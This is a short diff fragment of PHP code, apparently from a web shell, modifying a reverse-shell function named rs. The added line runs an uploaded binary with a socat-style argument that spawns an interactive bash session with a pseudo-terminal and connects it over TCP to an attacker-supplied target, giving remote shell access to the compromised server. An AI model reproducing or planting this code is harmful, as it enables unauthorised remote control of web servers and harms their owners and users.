@@ -196,7 +196,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
 			if(is_file($s_fpath)){
 				if(is_file($s_fpath)){
 					$s_result = exe("chmod +x ".$s_fpath);
-					$s_result = exe("./".$s_fpath." ".$s_rstarget);
+					$s_result = exe("./".$s_fpath." exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:".$s_rstarget);
 				}
 				else $s_result = $s_errperm;
 			}
